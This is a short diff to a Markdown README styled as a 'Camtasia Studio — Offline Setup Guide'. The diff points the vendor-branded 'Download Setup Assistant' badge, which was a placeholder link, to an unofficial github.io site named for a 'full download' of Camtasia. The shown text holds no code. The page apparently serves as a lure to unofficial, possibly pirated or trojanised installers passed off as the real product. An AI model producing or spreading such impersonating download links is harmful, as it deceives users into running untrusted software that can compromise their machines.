@@ -1,6 +1,6 @@
 # Camtasia Studio — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-005A9C?style=for-the-badge&logo=techsmith&logoColor=white)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-005A9C?style=for-the-badge&logo=techsmith&logoColor=white)](https://camtasia-studio-full-download.github.io/.github)
 
 ---
 
